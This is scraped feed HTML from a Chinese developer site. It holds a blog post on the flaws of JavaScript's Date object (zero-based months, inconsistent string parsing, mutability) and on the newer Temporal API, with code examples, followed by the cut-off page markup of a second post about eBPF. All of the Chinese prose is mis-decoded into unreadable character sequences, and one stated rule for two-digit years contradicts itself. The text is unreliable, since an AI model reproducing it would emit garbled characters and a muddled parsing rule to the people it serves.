#ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. å‰è¨€</h2>
<p>ä½œä¸ºä¸€åå‰ç«¯å¼€å‘å·¥ç¨‹å¸ˆï¼Œä½ ä¸€å®šè¢« JavaScript çš„æ—¥æœŸå¤„ç†æŠ˜ç£¨è¿‡ã€‚</p>
<p>è¿™ä¸æ˜¯ä½ çš„é—®é¢˜ï¼Œæ˜¯ JavaScript è‡ªå·±çš„é—®é¢˜â€”â€”å®ƒçš„ Date åŠŸèƒ½çœŸçš„å¾ˆç³Ÿç³•ã€‚</p>
<h2 data-id="heading-1">2. Date çš„ç¦»è°±è¡Œä¸º</h2>
<p>è®©æˆ‘ç»™ä½ ä¸¾å‡ ä¸ªä¾‹å­ï¼Œä½ å°±æ˜ç™½æœ‰å¤šç¦»è°±äº†ï¼š</p>
<p><strong>æœˆä»½ä» 0 å¼€å§‹è®¡æ•°ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½ ä»¥ä¸ºè¿™æ˜¯ 2026 å¹´ 1 æœˆ 1 æ—¥ï¼Ÿ</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-number">2026</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>));
<span class="hljs-comment">// ç»“æœï¼š2026 å¹´ 2 æœˆ 1 æ—¥ï¼</span>

<span class="hljs-comment">// å› ä¸ºæœˆä»½æ˜¯ä» 0 å¼€å§‹æ•°çš„ï¼š0=1æœˆï¼Œ1=2æœˆ...</span>
<span class="hljs-comment">// ä½†å¹´ä»½å’Œæ—¥æœŸåˆæ˜¯æ­£å¸¸è®¡æ•°çš„</span>
</code></pre>
<p><strong>æ—¥æœŸæ ¼å¼æ··ä¹±åˆ°è®©äººæŠ“ç‹‚ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç”¨æ–œæ åˆ†éš”ï¼ŒåŠ ä¸åŠ å‰å¯¼é›¶éƒ½æ²¡é—®é¢˜</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"2026/01/02"</span>));
<span class="hljs-comment">// Fri Jan 02 2026 00:00:00 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)</span>

<span class="hljs-comment">// ä½†å¦‚æœç”¨çŸ­æ¨ªçº¿åˆ†éš”ï¼ŒåŒæ ·çš„å†™æ³•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"2026-01-02"</span>));
<span class="hljs-comment">// Fri Jan 02 2026 08:00:00 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)</span>

<span class="hljs-comment">// æ—¶é—´å±…ç„¶ä¸ä¸€æ ·äº†ï¼</span>

<span class="hljs-comment">// å¦‚æœç”¨ä¸œåŠçƒæ ‡å‡†æ—¶é—´ï¼Œæ›´ç¦»è°±ï¼ä¸€ä¸ªæ˜¯ 1 æœˆ 2 æ—¥ï¼Œä¸€ä¸ªæ˜¯ 1 æœˆ 1 æ—¥</span>
</code></pre>
<p><strong>ä¸¤ä½æ•°å¹´ä»½çš„è¿·æƒ‘è¡Œä¸ºï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"49"</span>)); <span class="hljs-comment">// 2049 å¹´</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"99"</span>)); <span class="hljs-comment">// 1999 å¹´</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"100"</span>)); <span class="hljs-comment">// å…¬å…ƒ 100 å¹´ï¼</span>
</code></pre>
<p>è§„åˆ™è«åå…¶å¦™ï¼š33-99 ä»£è¡¨ 1900 å¹´ä»£ï¼Œä½† 32-49 åˆä»£è¡¨ 2000 å¹´ä»£ï¼Œ100 ä»¥ä¸Šå°±çœŸçš„æ˜¯å…¬å…ƒé‚£ä¸€å¹´äº†ã€‚</p>
<p><strong>æ›´è‡´å‘½çš„é—®é¢˜æ˜¯ â€”â€” æ—¥æœŸå±…ç„¶å¯ä»¥è¢«â€œæ”¹å˜â€ï¼</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> today = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(today.<span class="hljs-title function_">toDateString</span>()); <span class="hljs-comment">// Fri Jan 09 2026</span>

<span class="hljs-comment">// æˆ‘æƒ³ç®—ä¸€ä¸‹æ˜å¤©æ˜¯å‡ å·</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">addDay</span> = (<span class="hljs-params">theDate</span>) =&gt; {
  theDate.<span class="hljs-title function_">setDate</span>(theDate.<span class="hljs-title function_">getDate</span>() + <span class="hljs-number">1</span>);
  <span class="hljs-keyword">return</span> theDate;
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ˜å¤©æ˜¯ <span class="hljs-subst">${addDay(today).toLocaleDateString()}</span>ã€‚`</span>);
<span class="hljs-comment">// æ˜å¤©æ˜¯ 2026/1/10ã€‚</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä»Šå¤©æ˜¯ <span class="hljs-subst">${today.toLocaleDateString()}</span>ã€‚`</span>);
<span class="hljs-comment">// ä»Šå¤©æ˜¯ 2026/1/10ã€‚</span>

<span class="hljs-comment">// ç­‰ç­‰ï¼Œä»Šå¤©æ€ä¹ˆä¹Ÿå˜æˆæ˜å¤©äº†ï¼Ÿï¼</span>
</code></pre>
<p>å½“ç„¶è¿™æ˜¯å¯ä»¥è§£é‡Šçš„ï¼š</p>
<p>å› ä¸º <code>today</code> å°±åƒä¸€ä¸ªåœ°å€ï¼ŒæŒ‡å‘å†…å­˜é‡Œçš„æŸä¸ªä½ç½®ã€‚å½“ä½ æŠŠ today ä¼ ç»™å‡½æ•°æ—¶ï¼Œå‡½æ•°æ‹¿åˆ°çš„ä¹Ÿæ˜¯è¿™ä¸ªåœ°å€ã€‚æ‰€ä»¥å½“å‡½æ•°ä¿®æ”¹æ—¥æœŸæ—¶ï¼ŒåŸæ¥çš„ today ä¹Ÿè¢«æ”¹äº†ã€‚</p>
<p><strong>ä½†è¿™ç§è®¾è®¡è¿åäº†ä¸€ä¸ªåŸºæœ¬å¸¸è¯†ï¼šæ—¥æœŸåº”è¯¥æ˜¯å›ºå®šçš„ã€‚</strong>â€œ2026 å¹´ 1 æœˆ 10 æ—¥â€å°±æ˜¯â€œ2026 å¹´ 1 æœˆ 10 æ—¥â€ï¼Œä¸åº”è¯¥å› ä¸ºä½ æ‹¿å®ƒåšäº†ä¸ªè®¡ç®—ï¼Œå®ƒè‡ªå·±å°±å˜äº†ã€‚</p>
<p>æ‰€ä»¥ Date çœŸçš„å¾ˆç³Ÿç³•ã€‚å®é™…ä¸Šï¼Œå®ƒå°±æ˜¯æŒ‚ç¾Šå¤´å–ç‹—è‚‰ï¼Œå®ƒå«åš Dateï¼Œè¡¨ç¤ºæ—¥æœŸï¼Œå®é™…ä¸Šï¼Œå®ƒæ˜¯æ—¶é—´ã€‚</p>
<p>åœ¨å†…éƒ¨ï¼ŒDate æ˜¯ä»¥æ•°å€¼å½¢å¼å­˜å‚¨çš„ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„ä»¥ 1000 æ¯«ç§’ä¸ºå•ä½çš„æ—¶é—´æˆ³ã€‚</p>
<p>æ—¶é—´å½“ç„¶åŒ…å«æ—¥æœŸï¼Œä½ å¯ä»¥ä»æ—¶é—´ä¸­æ¨æ–­å‡ºæ—¥æœŸï¼Œä½†è¿™å¤šå°‘æœ‰ç‚¹æ¶å¿ƒäº†ã€‚</p>
<p><strong>Java æ—©åœ¨ 1997 å¹´å°±å¼ƒç”¨äº†å…¶ Date ç±»ï¼Œè€Œ JavaScript çš„ Date ç±»ä»…ä»…åœ¨å‡ å¹´åå°±é—®ä¸–äº†ï¼›ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬å´ä¸€ç›´è¢«è¿™ä¸ªçƒ‚æ‘Šå­å›°æ‰°ç€ã€‚</strong></p>
<p>æ­£å¦‚ä½ ç›®å‰æ‰€è§ï¼Œå®ƒåœ¨è§£ææ—¥æœŸæ–¹é¢æå…¶ä¸ç¨³å®šã€‚å®ƒé™¤äº†æœ¬åœ°æ—¶é—´å’Œæ ¼æ—å¨æ²»æ ‡å‡†æ—¶é—´ (GMT) ä¹‹å¤–ï¼Œå¯¹å…¶ä»–æ—¶åŒºä¸€æ— æ‰€çŸ¥ã€‚è€Œä¸”ï¼ŒDate ç±»åªæ”¯æŒå…¬å†ã€‚å®ƒå®Œå…¨ä¸ç†è§£å¤ä»¤æ—¶çš„æ¦‚å¿µã€‚å½“ç„¶æœ€ç³Ÿç³•çš„è¿˜æ˜¯å®ƒçš„å¯å˜çš„ï¼Œè¿™ç›´æ¥è®©ä»–åç¦»äº†æ—¶é—´çš„æœ¬è´¨ã€‚</p>
<p>æ‰€æœ‰è¿™äº›ç¼ºé™·ä½¿å¾—ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“æ¥è§£å†³è¿™äº›é—®é¢˜å˜å¾—å¼‚å¸¸æ™®éï¼Œå…¶ä¸­ä¸€äº›åº“ä½“ç§¯åºå¤§ï¼Œè¿™ç§æ€§èƒ½æŸè€—å·²ç»å¯¹ç½‘ç»œé€ æˆäº†åˆ‡å®å¯è¡¡é‡çš„æŸå®³ã€‚</p>
<h2 data-id="heading-2">3. Temporal æ‰æ˜¯æœªæ¥</h2>
<p>å¹¸è¿çš„æ˜¯ï¼ŒDate å³å°†å½»åº•é€€å‡ºå†å²èˆå°ã€‚</p>
<p>å½“ç„¶è¿™æ ·è¯´ï¼Œè¿˜æ˜¯æœ‰ç‚¹å¤¸å¼ äº†ã€‚</p>
<p>å®é™…ä¸Šæ˜¯å®ƒä¼šä¸€ç›´å­˜åœ¨ï¼Œä½†å¦‚æœå¯ä»¥é¿å…ï¼Œä½ æœ€å¥½ä¸è¦å†ç”¨å®ƒäº†ã€‚</p>
<p>å› ä¸ºæˆ‘ä»¬ä¼šæœ‰ä¸€ä¸ªå®Œå…¨å–ä»£ Date çš„å¯¹è±¡ â€”â€” Temporalã€‚</p>
<p>éƒ¨åˆ†åŒå­¦å¯èƒ½å¯¹ Temporal è¿™ä¸ªå•è¯ä¸å¤ªç†Ÿæ‚‰ï¼Œå®é™…ä¸Šï¼Œå®ƒçš„æ„æ€å°±æ˜¯â€œæ—¶é—´â€ï¼Œä½ å¯ä»¥ç†è§£ä¸ºå®ƒæ˜¯ä¸€ä¸ªæ›´ä¸“ä¸šçš„è¯æ±‡ï¼š</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c478354123a4214853e034b8c02423c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535532&amp;x-signature=7zkUgKz23CCjqWyyF%2Fi5aBlT07Q%3D" alt="" loading="lazy"/></p>
<p>ä¸ Date ä¸åŒï¼ŒTemporal ä¸æ˜¯æ„é€ å‡½æ•°ï¼Œå®ƒæ˜¯ä¸€ä¸ªå‘½åç©ºé—´å¯¹è±¡â€”â€”ä¸€ä¸ªç”±é™æ€å±æ€§å’Œæ–¹æ³•ç»„æˆçš„æ™®é€šå¯¹è±¡ï¼Œå°±åƒ Math å¯¹è±¡ä¸€æ ·ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Temporal</span>);
<span class="hljs-comment">/* Result (expanded):
Temporal { â€¦ }
  Duration: function Duration()
  Instant: function Instant()
  Now: Temporal.Now { â€¦ }
  PlainDate: function PlainDate()
  PlainDateTime: function PlainDateTime()
  PlainMonthDay: function PlainMonthDay()
  PlainTime: function PlainTime()
  PlainYearMonth: function PlainYearMonth()
  ZonedDateTime: function ZonedDateTime()
  Symbol(Symbol.toStringTag): "Temporal"
*/</span>
</code></pre>
<p>Temporal åŒ…å«çš„ç±»å’Œå‘½åç©ºé—´å¯¹è±¡å…è®¸ä½ è®¡ç®—ä¸¤ä¸ªæ—¶é—´ç‚¹ä¹‹é—´çš„æŒç»­æ—¶é—´ã€è¡¨ç¤ºä¸€ä¸ªæ—¶é—´ç‚¹ï¼ˆæ— è®ºæ˜¯å¦å…·æœ‰æ—¶åŒºä¿¡æ¯ï¼‰ã€é€šè¿‡ Now å±æ€§è®¿é—®å½“å‰æ—¶é—´ç‚¹ç­‰ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬è¦è·å–å½“å‰æ—¶é—´ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Temporal</span>.<span class="hljs-property">Now</span>.<span class="hljs-title function_">plainDateISO</span>());
<span class="hljs-comment">/* Result (expanded):
Temporal.PlainDate 2025-12-31
  &lt;prototype&gt;: Object { â€¦ }
*/</span>
</code></pre>
<p>è¯¥æ–¹æ³•è¿”å›çš„æ˜¯å½“å‰æ—¶åŒºçš„ä»Šå¤©æ—¥æœŸã€‚</p>
<p>Temporal è¿˜èƒ½æ”¯æŒæ—¶åŒºï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> date = <span class="hljs-title class_">Temporal</span>.<span class="hljs-property">Now</span>.<span class="hljs-title function_">plainDateISO</span>();

<span class="hljs-comment">// æŒ‡å®šè¿™ä¸ªæ—¥æœŸåœ¨ä¼¦æ•¦æ—¶åŒº</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(date.<span class="hljs-title function_">toZonedDateTime</span>(<span class="hljs-string">"Europe/London"</span>));
</code></pre>
<p>Temporal è¿˜å¯ä»¥è®¡ç®—æ—¥æœŸå·®ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> today = <span class="hljs-title class_">Temporal</span>.<span class="hljs-property">Now</span>.<span class="hljs-title function_">plainDateISO</span>();
<span class="hljs-keyword">const</span> jsShipped = <span class="hljs-title class_">Temporal</span>.<span class="hljs-property">PlainDate</span>.<span class="hljs-title function_">from</span>(<span class="hljs-string">"1995-12-04"</span>); <span class="hljs-comment">// JavaScript å‘å¸ƒæ—¥æœŸ</span>
<span class="hljs-keyword">const</span> difference = today.<span class="hljs-title function_">since</span>(jsShipped, { <span class="hljs-attr">largestUnit</span>: <span class="hljs-string">"year"</span> });

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`JavaScript å·²ç»å­˜åœ¨äº† <span class="hljs-subst">${difference.years}</span> å¹´ <span class="hljs-subst">${difference.months}</span> ä¸ªæœˆé›¶ <span class="hljs-subst">${difference.days}</span> å¤©ã€‚`</span>);
</code></pre>
<p>å„ç§æ—¶é—´æ“ä½œä¹Ÿä¼šæ›´åŠ ç›´è§‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> today = <span class="hljs-title class_">Temporal</span>.<span class="hljs-property">Now</span>.<span class="hljs-title function_">plainDateISO</span>();

<span class="hljs-comment">// åŠ ä¸€å¤©</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(today.<span class="hljs-title function_">add</span>({ <span class="hljs-attr">days</span>: <span class="hljs-number">1</span> }));

<span class="hljs-comment">// åŠ ä¸€ä¸ªæœˆé›¶ä¸€å¤©ï¼Œå†å‡ä¸¤å¹´â€”â€”å¯ä»¥é“¾å¼æ“ä½œ</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(today.<span class="hljs-title function_">add</span>({ <span class="hljs-attr">months</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">days</span>: <span class="hljs-number">1</span> }).<span class="hljs-title function_">subtract</span>({ <span class="hljs-attr">years</span>: <span class="hljs-number">2</span> }));

<span class="hljs-comment">// çœ‹ï¼Œå¤šæ¸…æ¥šï¼</span>
</code></pre>
<p>å½“ç„¶ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œæ—¥æœŸä¸ä¼šè¢«æ„å¤–ä¿®æ”¹</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> today = <span class="hljs-title class_">Temporal</span>.<span class="hljs-property">Now</span>.<span class="hljs-title function_">plainDateISO</span>();

<span class="hljs-comment">// è®¡ç®—æ˜å¤©çš„æ—¥æœŸ</span>
<span class="hljs-keyword">const</span> tomorrow = today.<span class="hljs-title function_">add</span>({ <span class="hljs-attr">days</span>: <span class="hljs-number">1</span> });

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä»Šå¤©æ˜¯ <span class="hljs-subst">${today}</span>ã€‚`</span>); <span class="hljs-comment">// 2025-12-31</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ˜å¤©æ˜¯ <span class="hljs-subst">${tomorrow}</span>ã€‚`</span>); <span class="hljs-comment">// 2026-01-01</span>

<span class="hljs-comment">// ä»Šå¤©è¿˜æ˜¯ä»Šå¤©ï¼Œå®Œç¾ï¼</span>
</code></pre>
<p><code>add</code> æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ªæ–°çš„æ—¥æœŸå¯¹è±¡ï¼Œè€Œä¸æ˜¯ä¿®æ”¹åŸæ¥çš„ã€‚å°±åƒä½ å¤å°äº†ä¸€ä»½æ—¥å†ï¼Œåœ¨å¤å°ä»¶ä¸Šå†™å­—ï¼ŒåŸä»¶ä¸ä¼šè¢«å¼„è„ã€‚</p>
<h2 data-id="heading-3">4. ä»€ä¹ˆæ—¶å€™èƒ½ç”¨ï¼Ÿ</h2>
<p>å¥½æ¶ˆæ¯ï¼šæœ€æ–°ç‰ˆçš„ Chrome å’Œ Firefox å·²ç»æ”¯æŒäº†ï¼</p>
<p>åæ¶ˆæ¯ï¼šå®ƒè¿˜åœ¨â€œå®éªŒé˜¶æ®µâ€ï¼Œè¿™æ„å‘³ç€å…·ä½“ç”¨æ³•å¯èƒ½è¿˜ä¼šå¾®è°ƒï¼Œä½†å¤§æ–¹å‘å·²å®šã€‚</p>
<p>æˆ‘ä»¬ç»ˆäºè¦å’Œ Date çš„å™©æ¢¦è¯´å†è§äº†ã€‚</p>
<p>æˆ‘æ˜¯å†´ç¾½ï¼Œ10 å¹´ç¬”è€•ä¸è¾ï¼Œä¸“æ³¨å‰ç«¯é¢†åŸŸï¼Œæ›´æ–°äº† 10+ ç³»åˆ—ã€300+ ç¯‡åŸåˆ›æŠ€æœ¯æ–‡ç« ï¼Œç¿»è¯‘è¿‡ Svelteã€Solid.jsã€TypeScript æ–‡æ¡£ï¼Œè‘—æœ‰å°å†Œã€ŠNext.js å¼€å‘æŒ‡å—ã€‹ã€ã€ŠSvelte å¼€å‘æŒ‡å—ã€‹ã€ã€ŠAstro å®æˆ˜æŒ‡å—ã€‹ã€‚</p>
<p>æ¬¢è¿å›´è§‚æˆ‘çš„â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">ç½‘é¡µç‰ˆæœ‹å‹åœˆ</a>â€ï¼Œå…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>å†´ç¾½ï¼ˆæˆ–æœç´¢ yayujsï¼‰</strong> ï¼Œæ¯å¤©åˆ†äº«å‰ç«¯çŸ¥è¯†ã€AI å¹²è´§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æœ‰äººè´¨ç–‘æˆ‘ebpfæ°´å¹³]]></title>    <link>https://juejin.cn/post/7593015632078389275</link>    <guid>https://juejin.cn/post/7593015632078389275</guid>    <pubDate>2026-01-09T03:57:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7593015632078389275" data-draft-id="7592944032773029939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æœ‰äººè´¨ç–‘æˆ‘ebpfæ°´å¹³"/> <meta itemprop="keywords" content="Linux"/> <meta itemprop="datePublished" content="2026-01-09T03:57:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¡¬æ ¸å­ç‰™"/> <meta itemprop="url" content="https://juejin.cn/user/676954895557288"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æœ‰äººè´¨ç–‘æˆ‘ebpfæ°´å¹³
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/676954895557288/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¡¬æ ¸å­ç‰™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:57:52.000Z" title="Fri Jan 09 2026 03:57:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul 